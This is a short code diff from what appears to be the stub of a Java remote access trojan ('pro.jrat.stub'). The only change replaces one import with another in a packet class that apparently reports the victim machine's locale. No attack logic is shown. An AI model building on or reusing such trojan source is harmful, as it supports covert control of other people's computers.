@@ -3,7 +3,8 @@ package pro.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 import java.util.Locale;
 
-import com.redpois0n.common.io.StringWriter;
+import pro.jrat.common.io.StringWriter;
+
 
 public class Packet10InitDefaultLocale extends AbstractOutgoingPacket {
 	
